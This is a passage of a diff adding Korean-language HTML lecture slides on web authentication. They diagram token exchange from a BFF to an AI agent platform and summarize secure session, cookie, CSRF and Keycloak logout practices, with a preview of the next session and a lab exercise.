+      <text x="1025" y="150" text-anchor="middle" class="svg-text xs mono">report-api</text>
+      <rect x="700" y="18" width="210" height="80" rx="8" class="svg-token"/>
+      <text x="712" y="38" class="svg-text small b token">교환된 토큰</text>
+      <text x="712" y="56" class="svg-text mono xs">"sub": "kim"</text>
+      <text x="712" y="72" class="svg-text mono xs">"act": { "azp": "report-agent" }</text>
+      <text x="712" y="88" class="svg-text mono xs">"aud": "report-api"</text>
+      <path d="M805,98 L805,133" class="svg-line token dashed"/>
+      <path d="M160,135 L218,135" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="189" y="88" text-anchor="middle" class="svg-text small">① 쿠키</text>
+      <path d="M400,135 L458,135" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="429" y="88" text-anchor="middle" class="svg-text small token">② 사용자 토큰</text>
+      <path d="M530,170 L530,234" class="svg-line idp" marker-end="url(#arrow-idp)"/>
+      <text x="520" y="222" text-anchor="end" class="svg-text small idp">③ Token Exchange</text>
+      <path d="M590,234 L590,170" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="600" y="222" class="svg-text small token">④ 교환된 토큰</text>
+      <path d="M660,135 L928,135" class="svg-line token thick" marker-end="url(#arrow-token)"/>
+      <text x="794" y="158" text-anchor="middle" class="svg-text small token">⑤ Bearer (교환된 토큰)</text>
+      <text x="300" y="192" text-anchor="middle" class="svg-text small b">사용자 토큰은 여기에만 있다</text>
+    </svg>
+    <figcaption>BFF → 사용자 토큰 → 에이전트 플랫폼 → Token Exchange. 업무 API는 "누가(kim)"와 "누구를 통해(report-agent)"를 둘 다 안다 → 감사 로그, 사용자 role 유지.</figcaption>
+  </figure>
+  <div class="card note mt"><p>BFF가 사용자 토큰을 그대로 들고 있기 때문에, 에이전트가 <strong>"사용자 대신"</strong> 부를 수 있는 재료가 생긴다. 그 재료를 어떻게 좁혀서(scope, aud) 넘기는지가 4회차.</p></div>
+  <aside class="notes">BFF가 없고 SPA가 토큰을 들고 있어도 Token Exchange는 가능하다. 하지만 사용자 토큰이 브라우저에 노출된 채로 에이전트까지 흘러가면 공격면이 두 배가 된다. BFF가 "사용자 토큰의 단일 보관소"가 되는 것이 4회차 설계의 전제.</aside>
+</section>
+
+<!-- 28. 요약 + 다음 회차 -->
+<section class="slide">
+  <h2>요약</h2>
+  <div class="cols">
+    <ul class="checklist">
+      <li>권한 판단은 <strong>BE에만</strong>. FE의 숨김은 편의.</li>
+      <li>토큰은 <strong>서버(BFF)</strong>에, 브라우저엔 <strong>HttpOnly 쿠키</strong>만.</li>
+      <li>페이지 요청은 <strong>302</strong>, API 요청은 <strong>401</strong> + FE 인터셉터.</li>
+      <li><strong>401</strong>은 로그인으로, <strong>403</strong>은 안내만 — 루프 방지.</li>
+      <li><code>oauth2Login()</code> + EntryPoint 분기 = BFF의 뼈대.</li>
+      <li>세션은 <strong>Redis</strong>, <strong>CSRF</strong>는 켜 둔 채 쿠키·헤더 방식.</li>
+      <li>로그아웃은 <strong>Keycloak SSO 세션까지</strong>.</li>
+      <li>FE와 BFF는 <strong>같은 출처</strong>에.</li>
+    </ul>
+    <div class="stack">
+      <div class="card note big">
+        <h3>다음 회차 — 4회차 A2A</h3>
+        <p>에이전트는 <strong>누구로</strong> API를 부르는가. 서비스 계정 / 패스스루 / Token Exchange, <code>act</code> 클레임, 멀티 에이전트의 scope·aud 최소화, MCP·A2A 프로토콜.</p>
+      </div>
+      <div class="card"><h3>실습 과제</h3><p class="small">2회차의 Keycloak에 <code>agent-portal</code> confidential client를 만들고, <code>oauth2Login()</code> + 401 분기 설정으로 <code>/api/me</code>가 로그인 전 401, 후 200을 돌려주는지 확인한다.</p></div>
+    </div>
+  </div>
+</section>
+
+</main>
+<script src="assets/slides.js"></script>
+</body>
+</html>
